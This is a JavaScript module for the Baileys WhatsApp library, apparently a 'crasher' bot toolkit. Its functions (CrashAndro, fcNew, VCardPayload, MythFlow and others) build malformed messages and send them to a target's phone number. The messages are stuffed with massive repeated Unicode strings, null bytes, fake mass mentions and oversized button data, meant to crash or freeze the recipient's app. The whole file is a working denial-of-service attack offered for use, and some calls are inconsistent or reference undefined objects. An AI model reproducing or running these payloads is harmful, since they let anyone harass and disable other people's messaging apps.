const {
default: makeWASocket, 
prepareWAMessageMedia, 
removeAuthState,
useMultiFileAuthState, 
DisconnectReason, 
fetchLatestBaileysVersion, 
makeInMemoryStore, 
generateWAMessageFromContent, 
generateWAMessageContent, 
generateWAMessage,
jidDecode, 
proto, 
delay,
relayWAMessage, 
getContentType, 
generateMessageTag,
getAggregateVotesInPollMessage, 
downloadContentFromMessage, 
fetchLatestWaWebVersion, 
InteractiveMessage, 
makeCacheableSignalKeyStore, 
Browsers, 
generateForwardMessageContent, 
MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');

async function delay(target, ptcp = false) {
await XPanz.relayMessage(target, 
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(99999),
format: "EXTENSIONS_1"
},
nativeFlowResponseMessage: {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AroganzzCrasher Aboutz XMemek\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Aroganzzcrasher@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(99999)}\",\"screen_0_TextInput_1\":ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3
}
}
}
}
}, 
ptcp ? { participant: { jid: target } } : {}
);
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function epcisepong(XPanz, target) {
let message = {
newsletterAdminInviteMessage: {
newsletterJid: "12345678@newsletter",
newsletterName: "YЦИΛΛ :: 404.ΣXΣ" + "꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰".repeat(99999),
caption: "YЦИΛΛ :: 404.ΣXΣ" + "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰".repeat(9999),
inviteExpiration: Date.now() + 1814400000,
contextInfo: {
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from(
{ length: 1900 },
() => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
remoteJid: "X",
participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
stanzaId: "123",
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot"
}
}
},
},
};

await XPanz.relayMessage(target, message, {
messageId: "",
participant: { jid: target },
});

const stickerMsg = {
viewOnceMessage: {
message: {
stickerMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
mimetype: "image/webp",
fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
fileLength: "1173741824",
mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
mediaKeyTimestamp: "1743225419",
isAnimated: false,
viewOnce: false,
contextInfo: {
mentionedJid: [
target,
...Array.from({ length: 1900 }, () =>
"92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
],
isSampled: true,
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9999,
isForwarded: true,
quotedMessage: {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: { text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰ΣXΣ", format: "DEFAULT" },
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(99999),
version: 3
}
}
}
}
}
}
}
}
}
};

const msg = generateWAMessageFromContent(target, stickerMsg, {});
await XPanz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function VCardPayload(target) {
const vcardPayload = {
contacts: {
displayName: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(25555) + "\u0000\u0000\u0000",
contacts: [
{
displayName: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(15000) + "\u0003\u0003\u0003",
vcard: `BEGIN:VCARD
VERSION:3.0
N:;;;; 
FN:${"꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰".repeat(15000) + "\u0000\u0000\u0000"}
item1.TEL;waid=639484734523:+63 948 473 4523
item1.X-ABLabel:Telepon
END:VCARD`
}
]
},
contextInfo: {
participant: target,
remoteJid: "status@broadcast",
mentionedJid: [
target,
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net"
]
}
};

const vcardMsg = generateWAMessageFromContent(target, vcardPayload, {});
await XPanz.relayMessage(target, vcardMsg.message, { messageId: "" });

const invitePayload = {
viewOnceMessage: {
message: {
newsletterAdminInviteMessage: {
newsletterJid: "120363418703070877@newsletter",
newsletterName: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(20000),
jpegThumbnail: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAUA", "base64"),
caption: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰'".repeat(20000) + "\u0000\u0000\u0000",
inviteExpiration: 999999999
}
},
contextInfo: {
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [
target,
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net"
]
}
}
};
const inviteMsg = generateWAMessageFromContent(target, invitePayload, {});
await XPanz.relayMessage(target, inviteMsg.message, { messageId: "" });
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function fcNew(target, XPanz) {
const msg = await generateWAMessageFromContent("status@broadcast", {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/29907024_1481616839492954_6435324964027351981_n.enc?ccb=11-4&oh=01_Q5Aa1wF1v6apVaUgmygg63RN-B20fijtLIzaLJIDFh3STlEjrQ&oe=6890C68F&_nc_sid=5e03e0&mms3=true",
caption: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(20000) + "\u0000".repeat(20000),
mimetype: "video/mp4",
fileSha256: "1o9ljMUDxEw6cTbg4iUUVtRiVSwdF8WFEKGMUybekx8=",
fileLength: "4761292",
seconds: 30,
mediaKey: "EdyjC44Fdghh4e8gn3lr/eZ82hE2ddMC87o+Pwx/Dy4=",
height: 848,
width: 340,
fileEncSha256: "qCdyO6io/+5E+omu2+O90avZbGLddSQZHrXRFrQKq58=",
directPath: "/v/t62.7161-24/29907024_1481616839492954_6435324964027351981_n.enc",
mediaKeyTimestamp: 1751731154,
jpegThumbnail: null
},
contextInfo: {
quotedMessage: {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: ""
},
footer: {
text: "AroganzzCrasher"
},
header: {
type: "text",
text: ""
},
buttons: [
{
buttonId: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(30000) + "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(30000),
buttonText: {
displayText: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰" + "\u200E".repeat(50000)
},
type: 1
}
]
}
}
}
}
}
}
}
});

await XPanz.relayMessage("status@broadcast", msg.message, {
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target }
}
]
}
]
}
]
});
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function freezeSw(target) {
await Pdf.relayMessage("status@broadcast", {
interactiveResponseMessage: {
body: {
text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰", 
format: "EXTENTION_1"
}, 
contextInfo: {
mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
statusAttributionType: "SHARED_FROM_MENTION"
}, 
nativeFlowResponseMessage: {
name: "menu_options", 
paramsJson: "{\"display_text\":\" ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰\",\"id\":\".Grifith\",\"description\":\"Finnaly my?...\"}", 
version: "3"
}
}
}, {
statusJidList: [target]
}) 
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function MessageSQL(target) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: 'https://files.catbox.moe/dfb42j.mp4' }, 
},
{ upload: XPanz.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "",
body: "",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://t.me/VerseNotDev",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let i = 0; i < 10; i++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "" + "" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
title: "",
body: "",
thumbnailUrl: "https://example.com/",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://t.me/VerseNotDev",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await XPanz.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
} 

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function MythFlow(target) {
const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰",
hasMediaAttachment: false
},
body: {
text: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰" + "ꦾ꙰꙰ೄྀ꙰꙰".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"ꦾ꙰꙰ೄྀ꙰꙰ꦾ꙰꙰ೄྀ꙰꙰".repeat(19999)}`,
sections: [
{
title: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰",
rows: []
}
]
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"ꦽ꙰ꦾ꙰꙰ೄྀ꙰꙰".repeat(19999)}`,
url: "https://t.me/rizxvelzexct",
merchant_url: "https://t.me/rizxvelzexct"
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Execute ${"ꦽ꙰ꦾ꙰꙰ೄྀ꙰꙰".repeat(19999)}`,
url: "https://wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://wa.me/stickerpack/4izxvelzexect"
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Execute ${"ꦽ꙰ꦾ꙰꙰ೄྀ꙰꙰".repeat(19999)}`,
url: "https://wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://wa.me/stickerpack/4izxvelzexect"
})
}
]
}
}
}
}
},
)};

const Qcrl = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
interactiveMessage: {
body: { 
title: "AroganzzCrasher Attacking You", 
text: "\u0000".repeat(1000000),
footer: "AroganzzCrasher",
description: "ោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰AroganzzCrasherោ៝꙰꙰⃟̶҉꙰꙰꙰꙰꙰⃟̶҉꙰꙰ោ៝꙰"
},
carouselMessage: {
cards: []
},
contextInfo: {
mentionedJid: ["status@broadcast"]
}
}
}
};

async function CrashAndro(target) {
for (let i = 0; i <= 5; i++){
await delay(target, Qcrl, ptcp = true)
await sleep(6000)
await epcisepong(target, Qcrl)
await sleep(6000)
await VCardPayload(target, Qcrl)
await sleep(6000)
await fcNew(target, Qcrl)
await sleep(6000)
await freezeSw(target, Qcrl)
await sleep(6000)
} 
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

module.exports = { CrashAndro, MessageSQL, MythFlow, fcNew } 